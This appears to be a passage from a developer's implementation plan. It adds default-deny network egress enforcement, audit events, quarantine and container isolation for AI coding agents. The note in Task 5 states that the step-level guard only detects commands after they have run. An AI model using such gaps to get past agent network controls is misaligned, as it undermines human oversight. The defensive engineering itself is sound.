  it("lets an allowlisted host pass through to the existing HITL gate", async () => {
    const runner = new StepRunner([commandStep("curl https://api.example.com/data")]);
    const { service, store } = await makeService(runner);
    const agent = await service.createAgent({ name: "Granted" });
    await seedGrants(store, [egressGrantFor(agent.id)]);

    const { run } = await service.sendMessage(agent.id, "call the api");

    // Allowed egress still hits SEC-EGRESS-003 defense-in-depth approval.
    await expect
      .poll(() => service.listApprovals(agent.id, "pending").length)
      .toBe(1);
    const approval = service.listApprovals(agent.id, "pending")[0]!;
    await service.resolveApproval(approval.id, "approved");

    await expect.poll(() => service.getRun(run.id).status).toBe("completed");
    const events = service.getRunEvents(run.id);
    expect(events.map((event) => event.type)).not.toContain("egress.blocked");
    const decisionEvent = events.find((event) => event.type === "policy.decision");
    expect(JSON.parse(decisionEvent?.detail ?? "{}")).toMatchObject({
      allowed: true,
      grantId: "grant-egress-1",
    });
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/agent-service.egress.test.ts`
Expected: FAIL — `egressQuarantineThreshold` missing from config, runs complete instead of being blocked, no `policy.decision`/`egress.blocked` events.

- [ ] **Step 3: Add the threshold to `apps/server/src/config.ts`**

In `envSchema`, directly after the `RUN_BUDGET_MAX_DURATION_MS` line (line 56):

```ts
  EGRESS_QUARANTINE_THRESHOLD: z.coerce.number().int().min(1).default(3),
```

In the returned object of `loadConfig`, directly after `runBudgetMaxDurationMs` (line 120):

```ts
    egressQuarantineThreshold: env.EGRESS_QUARANTINE_THRESHOLD,
```

- [ ] **Step 4: Wire the guard into `apps/server/src/agent-service.ts`**

4a. Extend the imports (top of file):

```ts
import { EgressGuard, EgressQuarantineError } from "./egress-guard.js";
```

and add `Grant` to the type import list from `./types.js`.

4b. In `executeRun`, immediately before `let stepViolation: RunPolicyViolationError | null = null;` (line 501), create the guard. Spec: agent principal id is `"agent-<agentId>"`; WS-A stamps it on the agent, so prefer the stored field with the spec derivation as fallback. The store cast is temporary until WS-A's `Database` v4 adds `grants` (then simplify to `this.store.snapshot().grants`):

```ts
      const agentPrincipalId =
        (agentAtStart as Agent & { principalId?: string }).principalId ??
        "agent-" + agentAtStart.id;
      const grantsProvider = (): Grant[] =>
        (this.store.snapshot() as unknown as { grants?: Grant[] }).grants ?? [];
      const egressGuard = new EgressGuard(
        agentPrincipalId,
        grantsProvider,
        this.config.egressQuarantineThreshold,
      );
```

4c. Inside `onStep`, insert the egress check between the canary check (block ending line 516 `return;`) and the `// 2. Action Risk Assessment` comment; renumber the following comment to `// 3.`:

```ts
        // 2. Egress policy gate (WS-B): default deny, fail closed.
        const egressEvaluation = egressGuard.evaluateStep(step, now());
        if (egressEvaluation.decision) {
          const decision = egressEvaluation.decision;
          const timestamp = now();
          await this.store.mutate((database) => {
            this.appendRunEvent(database, {
              runId: run.id,
              agentId: agentAtStart.id,
              type: "policy.decision",
              severity: decision.allowed ? "info" : "warning",
              title: `Egress ${decision.allowed ? "allowed" : "denied"} (${decision.ruleId})`,
              detail: this.redact(JSON.stringify(decision)),
              createdAt: timestamp,
            });
            if (!decision.allowed) {
              this.appendRunEvent(database, {
                runId: run.id,
                agentId: agentAtStart.id,
                type: "egress.blocked",
                severity: "warning",
                title: "Egress blocked before execution",
                detail: this.redact(
                  `Step targeting host "${egressEvaluation.target.host ?? "<unresolved>"}" was blocked fail-closed ` +
                    `(blocked attempt ${egressGuard.blockedAttempts} of ${this.config.egressQuarantineThreshold} before quarantine). ` +
                    `Step: ${step.detail.slice(0, PREVIEW_LENGTH)}`,
                ),
                createdAt: timestamp,
              });
            }
          });
          if (!decision.allowed) {
            if (egressGuard.shouldQuarantine) {
              const quarantine = new EgressQuarantineError(
                egressGuard.blockedAttempts,
                egressGuard.blockedHosts,
              );
              stepViolation = quarantine;
              void this.runner.cancel(agentAtStart.id);
              throw quarantine;
            }
            stepViolation =
              stepViolation ??
              new RunPolicyViolationError(
                "egress",
                403,
                `Egress blocked (${decision.ruleId}): ${decision.reason}`,
              );
            return; // step blocked fail-closed: skip HITL gate and step recording
          }
        }
```

4d. In the `catch` block of `executeRun` (line 671), extend the classification. After the existing line `const isApprovalDenial = policyViolation && error.kind === "approval";` add:

```ts
      const isEgressQuarantine = error instanceof EgressQuarantineError;
      const isEgressBlock =
        policyViolation && error.kind === "egress" && !isEgressQuarantine;
```

Replace the agent-status line

```ts
            agent.status = cancelled || isApprovalDenial ? "ready" : policyViolation ? "stopped" : "error";
```

with (quarantine falls through to the existing `policyViolation ? "stopped"` stop path; a sub-threshold egress block behaves like an approval denial — run fails, agent stays usable):

```ts
            agent.status =
              cancelled || isApprovalDenial || isEgressBlock
                ? "ready"
                : policyViolation
                  ? "stopped"
                  : "error";
```

Replace the event `title` expression

```ts
          title: cancelled
            ? "Run cancelled"
            : isApprovalDenial
              ? "Run blocked by human operator denial"
              : policyViolation
                ? "Run blocked by guardrail"
                : "Run failed",
```

with:

```ts
          title: cancelled
            ? "Run cancelled"
            : isEgressQuarantine
              ? "Agent quarantined after repeated egress violations"
              : isEgressBlock
                ? "Run blocked by egress policy"
                : isApprovalDenial
                  ? "Run blocked by human operator denial"
                  : policyViolation
                    ? "Run blocked by guardrail"
                    : "Run failed",
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/agent-service.egress.test.ts`
Expected: PASS (4 tests).

- [ ] **Step 6: Run the full server suite and typecheck (regression gate)**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npm run typecheck && npm test`
Expected: PASS — in particular the pre-existing `agent-service.test.ts` "records trace events for a completed run" must still see exactly `run.created, run.started, run.completed` (its FakeRunner emits no steps, so the egress gate never fires).

- [ ] **Step 7: Commit**

```bash
cd /Users/zhuzhenzhuo/Projects/CodeJam
git add apps/server/src/config.ts apps/server/src/agent-service.ts apps/server/src/agent-service.egress.test.ts
git commit -m "feat(governance): enforce default-deny egress with fail-closed blocking and quarantine"
```

---

### Task 5: Container network hardening (`--network none` for zero-grant agents)

> **Corrected by empirical testing — read [the verified egress architecture](../specs/2026-08-30-egress-architecture-verified.md) before starting.**
>
> `--network none` for zero-grant agents is **verified correct and kept**. Two changes to what follows:
>
> 1. **Seed a standing `network:egress` grant for the model-API host** (Gemini adapter host / OpenRouter host, from `config.ts`) whenever an agent is created, and backfill it for existing agents in the same place the migration seeds principals. Without this, every agent has zero grants, every container gets `--network none`, and **no run can reach the model at all** — the baseline breaks. Task 5 must not land before this seeding does.
> 2. **Granted agents need the sidecar, not the host.** The original "host proxy + `HTTP_PROXY`" idea does not work: a container on an `--internal` network cannot reach `host.docker.internal` (tested: 000) nor the explicit gateway IP (000). What works is a **proxy sidecar attached to both the internal network and a bridge network**, reached by container name (tested: client→sidecar 200, sidecar→internet OK, client→internet 000). That is a follow-on task; this task only ships the zero-grant cutoff.
>
> Until the sidecar lands, be accurate in the README and the demo: the step-level guard is **detection** (it fires on `item.completed`, after the command has run), and `--network none` is the only real enforcement. Do not claim per-host enforcement for granted agents yet.

**Files:**
- Modify: `apps/server/src/container-codex-runner.ts:41-100` (`buildContainerRunArgs`)
- Modify: `apps/server/src/agent-service.ts:613-620` (the `this.runner.run({...})` call in `executeRun`)
- Test: `apps/server/src/container-codex-runner.test.ts`, `apps/server/src/agent-service.egress.test.ts`

**Interfaces:**
- Consumes: `RunnerRequest.hasEgressGrants?: boolean | undefined` (Task 1); `hasActiveEgressGrants(agentPrincipalId, grants, nowIso)` from `./egress-guard.js` (Task 3); `agentPrincipalId` and `grantsProvider` locals created in Task 4 step 4b.
- Produces: `buildContainerRunArgs` emits `--network none` (and drops `--add-host host.docker.internal:host-gateway`) exactly when `request.hasEgressGrants === false`; `AgentService.executeRun` populates `hasEgressGrants` on every runner request (`undefined` when the store has no grants table — see Global Constraints risk note).

- [ ] **Step 1: Write the failing container-args tests**

Append to the `describe("Container Codex runner", ...)` block in `apps/server/src/container-codex-runner.test.ts`:

```ts
  it("isolates container networking when the agent has zero egress grants", () => {
    const config = loadConfig({
      NODE_ENV: "test",
      CODEX_HOME: "/tmp/codex-home",
      RUNTIME_PROVIDER: "container",
    });
    const args = buildContainerRunArgs(
      {
        agentId: "agent",
        workspacePath: "/tmp/workspace",
        prompt: "hello",
        threadId: null,
        hasEgressGrants: false,
      },
      config,
    );
    expect(args[args.indexOf("--network") + 1]).toBe("none");
    expect(args).not.toContain("--add-host");
    expect(args).not.toContain("host.docker.internal:host-gateway");
  });

  it("keeps bridge networking when egress grants exist or are unknown", () => {
    const config = loadConfig({
      NODE_ENV: "test",
      CODEX_HOME: "/tmp/codex-home",
      RUNTIME_PROVIDER: "container",
    });
    for (const hasEgressGrants of [true, undefined]) {
      const args = buildContainerRunArgs(
        {
          agentId: "agent",
          workspacePath: "/tmp/workspace",
          prompt: "hello",
          threadId: null,
          hasEgressGrants,
        },
        config,
      );
      expect(args[args.indexOf("--network") + 1]).toBe("bridge");
      expect(args).toContain("host.docker.internal:host-gateway");
    }
  });
```

- [ ] **Step 2: Write the failing service-side tests**

Append to the `describe("egress enforcement in executeRun", ...)` block in `apps/server/src/agent-service.egress.test.ts`:

```ts
  it("marks runner requests hasEgressGrants=undefined before the grants table exists", async () => {
    const runner = new StepRunner([]);
    const { service } = await makeService(runner);
    const agent = await service.createAgent({ name: "Legacy" });
    const { run } = await service.sendMessage(agent.id, "hello");
    await expect.poll(() => service.getRun(run.id).status).toBe("completed");
    expect(runner.lastRequest?.hasEgressGrants).toBeUndefined();
  });

  it("marks runner requests hasEgressGrants=false when the grants table has no active egress grant", async () => {
    const runner = new StepRunner([]);
    const { service, store } = await makeService(runner);
    const agent = await service.createAgent({ name: "ZeroGrants" });
    await seedGrants(store, []);
    const { run } = await service.sendMessage(agent.id, "hello");
    await expect.poll(() => service.getRun(run.id).status).toBe("completed");
    expect(runner.lastRequest?.hasEgressGrants).toBe(false);
  });

  it("marks runner requests hasEgressGrants=true when an active egress grant exists", async () => {
    const runner = new StepRunner([]);
    const { service, store } = await makeService(runner);
    const agent = await service.createAgent({ name: "HasGrants" });
    await seedGrants(store, [egressGrantFor(agent.id)]);
    const { run } = await service.sendMessage(agent.id, "hello");
    await expect.poll(() => service.getRun(run.id).status).toBe("completed");
    expect(runner.lastRequest?.hasEgressGrants).toBe(true);
  });
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/container-codex-runner.test.ts src/agent-service.egress.test.ts`
Expected: FAIL — `--network` is always `bridge`; `lastRequest.hasEgressGrants` is always `undefined`.

- [ ] **Step 4: Implement the hardening**

4a. In `apps/server/src/container-codex-runner.ts`, `buildContainerRunArgs`, replace the fixed network arguments (lines 60–63):

```ts
    "--network",
    "bridge",
    "--add-host",
    "host.docker.internal:host-gateway",
```

with:

```ts
    // WS-B hardening: zero active network:egress grants -> no network at all.
    // undefined (grants table not migrated yet) keeps legacy bridge networking.
    ...(request.hasEgressGrants === false
      ? ["--network", "none"]
      : ["--network", "bridge", "--add-host", "host.docker.internal:host-gateway"]),
```

4b. In `apps/server/src/agent-service.ts`, `executeRun`, directly before the `const result = await this.runner.run({ ... })` call, compute the flag (reusing `agentPrincipalId` from Task 4 step 4b; `hasActiveEgressGrants` is added to the `./egress-guard.js` import):

```ts
      const grantsTable = (this.store.snapshot() as unknown as { grants?: Grant[] })
        .grants;
      const hasEgressGrants =
        grantsTable === undefined
          ? undefined
          : hasActiveEgressGrants(agentPrincipalId, grantsTable, now());
```

and pass it in the runner request:

```ts
      const result = await this.runner.run({
        agentId: agentAtStart.id,
        sessionId: run.sessionId,
        workspacePath: agentAtStart.workspacePath,
        prompt: run.prompt,
        threadId,
        onStep,
        hasEgressGrants,
      });
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/container-codex-runner.test.ts src/agent-service.egress.test.ts`
Expected: PASS (4 container tests, 7 egress service tests).

- [ ] **Step 6: Commit**

```bash
cd /Users/zhuzhenzhuo/Projects/CodeJam
git add apps/server/src/container-codex-runner.ts apps/server/src/agent-service.ts apps/server/src/agent-service.egress.test.ts apps/server/src/container-codex-runner.test.ts
git commit -m "feat(governance): run zero-egress-grant agents with --network none"
```

---

### Task 6: Full baseline verification

**Files:**
- No new files; verification only.

**Interfaces:**
- Consumes: everything above.
- Produces: green baseline gate required by the spec ("`npm run check` stays green").

- [ ] **Step 1: Run the repository check gate**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam && npm run check`
Expected: typecheck (all workspaces), full server test suite, and both builds PASS.

- [ ] **Step 2: Commit any stragglers and hand off**

```bash
cd /Users/zhuzhenzhuo/Projects/CodeJam && git status --short
```

Expected: clean tree (everything committed in Tasks 1–5). If `npm run check` surfaced fixes, commit them as `fix(governance): keep baseline green after egress enforcement`.

---

## WS-A merge checklist (coordination notes, not tasks)

When WS-A lands, this workstream's three deliberate seams close with mechanical edits:

1. `egress-guard.ts` `resolveEvaluateEgress()` — the fallback branch becomes dead code; may simplify to `import { evaluateEgress } from "./run-policies.js"`.
2. The `vi.mock("./run-policies.js", …)` block in `agent-service.egress.test.ts` and the `stubEvaluateEgress` in `egress-guard.test.ts` — both self-disable / are deletable (each is marked with a `WS-A stub` banner).
3. The `(… as unknown as { grants?: Grant[] })` store casts in `agent-service.ts` (two sites) — replace with typed `Database.grants` access; `hasEgressGrants` stops ever being `undefined` once the v4 migration guarantees the table.
4. Remind WS-A's owner to seed a `network:egress` grant for the model-API host on demo agents (see Risk note), or zero-grant agents cannot complete runs under `--network none` — which is also a legitimate demo beat.

## Spec coverage self-check (WS-B scope)

- "NET-EGRESS-020: default deny; allow only host with active network:egress grant" → Tasks 3–4 (evaluator consumed by signature; deny-all fallback until WS-A).
- "Egress deny → step blocked before execution (fail closed), `egress.blocked` + `policy.decision` events" → Task 4 step 4c.
- "repeated attempts (≥3 in one run) escalate to quarantine (existing stop path)" → Tasks 3 (counter + `EgressQuarantineError`) and 4 (throw + `agent.status = "stopped"` via existing `policyViolation` branch); threshold configurable, default 3.
- "Every decision (allow AND deny) is persisted as a RunEvent of type `policy.decision` with detail = JSON of the PolicyDecision" → Task 4 step 4c + tests in step 1.
- "Grant expiry mid-run → next evaluation denies … no caching of decisions" → Task 3 grants-provider design + "re-reads grants on every step" test.
- "`RunPolicyKind` gains `"egress"`" → Task 1 step 4.
- WS-B file table (`egress-guard.ts` new; `container-codex-runner.ts`, `agent-service.ts`, `run-policies.ts` modified) → Tasks 2/5/4/1 respectively.
- Testing requirements B ("allowlisted host passes, non-allowlisted blocked, quarantine after repeats") → Task 3 unit tests + Task 4 service tests; container isolation additionally covered in Task 5.
- Baseline preserved / `npm run check` green → Task 4 step 6 and Task 6.
